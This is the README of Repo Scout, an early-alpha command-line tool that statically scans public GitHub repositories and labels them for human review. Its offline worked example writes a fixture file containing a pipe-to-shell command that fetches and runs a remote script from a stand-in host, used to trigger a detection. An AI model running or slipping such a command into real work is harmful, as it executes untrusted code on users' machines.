# Repo Scout

Repo Scout is a local command-line tool for inspecting public GitHub repositories
before deciding whether to adopt or run them. It combines public metadata with
static file signals and produces an evidence-led report.

Repo Scout does not prove that software is safe, malicious, useful, or trustworthy.
Static evidence can miss dangerous behavior and can also flag legitimate fixtures.
Use the report to decide what needs human review.

## Install locally

Repo Scout declares support for Python 3.11 or newer and has no runtime dependencies.

```bash
python3 -m pip install --no-deps .
```

## Commands

```bash
repo-scout search "codex plugins"
repo-scout inspect owner/repo
repo-scout download owner/repo
repo-scout scan ./downloads/owner__repo
repo-scout report ./downloads/owner__repo
```

`search` accepts `--limit` to cap the number of results. `download` accepts
`--downloads-dir` to choose the clone destination.

Global options precede the command:

```bash
repo-scout --reports-dir reports scan ./downloads/owner__repo
```

`search` and `inspect` read public GitHub data. `download` performs a shallow Git
clone into `downloads/`. `scan` and `report` read local files and write Markdown and
HTML reports to `reports/` unless another reports directory is supplied. Repo Scout
does not execute downloaded code, package installers, tests, or binaries.

A report is written to be shared, so a local scan is identified in it by the scanned
directory's name only. The absolute path of the scanned directory is never written
into a report, and the report's URL field reads `none recorded` because a directory
on disk has no published address.

`inspect` caches public responses in a `.repo-scout-cache/` directory created in the
current working directory. It is created once the repository name is accepted, before
the request is made, so it also appears when the request itself then fails. An invalid
repository name is rejected first and creates nothing.

## Offline worked example

```bash
sample_root=$(mktemp -d)
mkdir -p "$sample_root/sample"
printf '%s\n' '# Sample project' > "$sample_root/sample/README.md"
printf '%s\n' 'curl https://downloads.invalid/install.sh | bash' > "$sample_root/sample/install.sh"
repo-scout --reports-dir "$sample_root/reports" scan "$sample_root/sample"
```

Expected result: an `AVOID` verdict with a `remote-shell` finding. `AVOID` means either
usefulness was low or static risk crossed the threshold, and here both are true. It is
not a malware verdict. See Verdicts below.

## Verdicts

Every report ends in one of three labels. They are prioritization labels for human
review, not safety judgments.

- `USE`: useful signals are strong and static risk signals are low.
- `INSPECT FIRST`: promising, but something needs a person to look at it.
- `AVOID`: usefulness is low or static risk crossed the threshold.

## Evidence states

Repository signals are `present`, `absent`, or `unknown`. `unknown` means the evidence
could not be established and is never silently converted into absence.

## Run tests

```bash
PYTHONDONTWRITEBYTECODE=1 python3 -m unittest discover -s tests -v
```

From a Git checkout the expected result is `OK`. From a repository archive, such as
GitHub's Download ZIP or `git archive`, the expected result is `OK (skipped=1)`: one
packaging test checks the `.gitignore` contract by asking `git check-ignore`, which
has no working tree to answer from there, so it reports the contract as unchecked
rather than broken.

A Python source distribution is different and is not yet supported for testing. There
is no `MANIFEST.in`, so an sdist omits `.gitignore`, `.github/`, `docs/` and the
community-health files, and the documentation and packaging tests fail. Run the suite
from a checkout or a repository archive.

## Project status

Repo Scout is version 0.1.0 and early alpha. Commands, scoring weights, and report
output can change without a deprecation period.

The test matrix in `.github/workflows/ci.yml` covers Python 3.11, 3.12, 3.13 and 3.14 on
Linux, and the suite passes on all four. Development and manual verification also happen
on macOS. The declared range in `pyproject.toml` is Python 3.11 or newer with no upper
bound, so versions above 3.14 are unverified, and Windows is untested. Treat any
combination the matrix does not cover as unverified.

There is no published release and no adoption or contribution history to report.
Maintenance is best effort by a single maintainer working in a weekly review block, with
AI assistance used and reviewed during development. Issues and pull requests may wait
days for a response.

## Project boundaries

- Public repositories only for network-backed commands.
- No GitHub token is required in V0.1.
- Public API availability and rate limits can make evidence unknown.
- Downloads are quarantined by location only; they are not sandboxed.
- Static patterns produce false positives and false negatives.
- Reports must be reviewed before making an adoption decision.

See [architecture](docs/architecture.md), [limitations](docs/limitations.md),
[roadmap](docs/roadmap.md), [contributing](CONTRIBUTING.md),
[security reporting](SECURITY.md), [support](SUPPORT.md), and the
[code of conduct](CODE_OF_CONDUCT.md).

## License

MIT
